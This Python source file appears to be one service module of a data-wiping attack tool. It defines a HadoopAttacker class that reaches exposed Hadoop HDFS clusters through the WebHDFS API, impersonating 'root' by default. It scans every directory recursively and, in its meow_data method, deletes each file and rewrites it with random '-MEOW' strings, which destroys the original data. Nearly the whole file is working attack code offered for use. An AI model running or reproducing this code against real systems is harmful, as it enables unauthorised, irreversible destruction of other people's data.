import random
import string
import requests
import json
from core.base_attacker import BaseAttacker

class HadoopAttacker(BaseAttacker):
    """
    Hadoop HDFS implementation of the BaseAttacker.
    Uses WebHDFS REST API to access and modify files.
    """

    @classmethod
    def get_service_name(cls):
        return "hadoop"

    @classmethod
    def get_default_port(cls):
        return 9870  # WebHDFS port (Hadoop 3.x)

    def connect(self):
        """
        Connect to Hadoop HDFS via WebHDFS API.
        """
        self.base_url = f"http://{self.host}:{self.port}/webhdfs/v1"

        # Create session for requests
        self.session = requests.Session()

        # WebHDFS uses user.name parameter for authentication
        self.webhdfs_user = self.username if self.username else "root"

        try:
            # Test connection by listing root directory
            response = self.session.get(
                f"{self.base_url}/?op=LISTSTATUS&user.name={self.webhdfs_user}",
                allow_redirects=True
            )
            if response.status_code != 200:
                raise Exception(f"Failed to connect: HTTP {response.status_code}")

            self.logger.info("Successfully connected to Hadoop HDFS")
            return self.session
        except Exception as e:
            self.logger.error(f"Failed to connect to Hadoop: {str(e)}")
            raise

    def get_databases(self):
        """
        In HDFS, directories are equivalent to databases.
        We'll recursively find all directories that contain files.
        """
        directories_with_files = []
        
        def scan_directory(path):
            """Recursively scan directories to find those containing files."""
            response = self.session.get(
                f"{self.base_url}{path}?op=LISTSTATUS&user.name={self.webhdfs_user}",
                allow_redirects=True
            )
            
            if response.status_code != 200:
                return
            
            result = response.json()
            file_statuses = result.get('FileStatuses', {}).get('FileStatus', [])
            
            has_files = False
            subdirs = []
            
            for fs in file_statuses:
                if fs['type'] == 'FILE':
                    has_files = True
                elif fs['type'] == 'DIRECTORY':
                    subdirs.append(fs['pathSuffix'])
            
            # If this directory has files, add it
            if has_files:
                directories_with_files.append(path)
            
            # Recursively scan subdirectories
            for subdir in subdirs:
                subpath = f"{path}/{subdir}" if path != '/' else f"/{subdir}"
                scan_directory(subpath)
        
        # Start scanning from root
        scan_directory('/')
        
        return directories_with_files if directories_with_files else ['/']

    def get_collections(self, directory):
        """
        In HDFS, files within a directory are like collections.
        Get list of files in the specified directory.
        """
        path = directory if directory.startswith('/') else f"/{directory}"

        response = self.session.get(
            f"{self.base_url}{path}?op=LISTSTATUS&user.name={self.webhdfs_user}",
            allow_redirects=True
        )

        if response.status_code != 200:
            self.logger.warning(f"Failed to list files in {path}: HTTP {response.status_code}")
            return []

        result = response.json()
        file_statuses = result.get('FileStatuses', {}).get('FileStatus', [])

        # Return only regular files (not directories)
        files = [fs['pathSuffix'] for fs in file_statuses if fs['type'] == 'FILE']

        return files if files else []

    def random_alphanumeric(self, length=10):
        """
        Generate a random alphanumeric string.
        """
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def meow_data(self, directory, filename):
        """
        Execute the MEOW attack on the specified file in HDFS.
        """
        path = f"{directory}/{filename}" if directory.startswith('/') else f"/{directory}/{filename}"

        # Read the file content with redirect handling
        read_url = f"{self.base_url}{path}?op=OPEN&user.name={self.webhdfs_user}"
        read_response = self.session.get(read_url, allow_redirects=False)
        
        # Handle redirect (DataNode will be on port 9864)
        if read_response.status_code == 307:
            redirect_url = read_response.headers.get('Location', '')
            # Replace hostname with IP if needed
            redirect_url = redirect_url.replace('hadoop:', f"{self.host}:")
            read_response = self.session.get(redirect_url)

        if read_response.status_code != 200:
            self.logger.warning(f"Failed to read file {path}: HTTP {read_response.status_code}")
            return 0

        try:
            # Try to parse as JSON
            data = read_response.json()

            # Replace all string/number values with MEOW
            meowed_data = {}
            for key, value in data.items():
                if isinstance(value, (str, int, float)):
                    random_chars = self.random_alphanumeric()
                    meowed_data[key] = f"{random_chars}-MEOW"
                else:
                    meowed_data[key] = value

            new_content = json.dumps(meowed_data)

        except json.JSONDecodeError:
            # If not JSON, treat as plain text and replace entire content
            random_chars = self.random_alphanumeric()
            new_content = f"{random_chars}-MEOW"

        # Delete the old file
        delete_response = self.session.delete(
            f"{self.base_url}{path}?op=DELETE&user.name={self.webhdfs_user}",
            allow_redirects=True
        )

        if delete_response.status_code not in (200, 201):
            self.logger.warning(f"Failed to delete file {path}: HTTP {delete_response.status_code}")
            return 0

        # Create new file with MEOWed content
        # Step 1: Create the file (get redirect location)
        create_response = self.session.put(
            f"{self.base_url}{path}?op=CREATE&user.name={self.webhdfs_user}&overwrite=true",
            allow_redirects=False
        )

        if create_response.status_code != 307:
            self.logger.warning(f"Failed to create file {path}: HTTP {create_response.status_code}")
            return 0

        # Step 2: Upload content to the redirect location
        upload_url = create_response.headers.get('Location')
        # Replace hostname with IP if needed
        upload_url = upload_url.replace('hadoop:', f"{self.host}:")
        
        upload_response = self.session.put(
            upload_url,
            data=new_content,
            headers={'Content-Type': 'application/octet-stream'}
        )

        if upload_response.status_code in (200, 201):
            self.logger.info(f"Modified file {path}")
            return 1
        else:
            self.logger.warning(f"Failed to upload MEOWed content to {path}: HTTP {upload_response.status_code}")
            return 0

    def close(self):
        """
        Close the Hadoop session.
        """
        if hasattr(self, 'session'):
            self.session.close()
            self.logger.info("Hadoop session closed")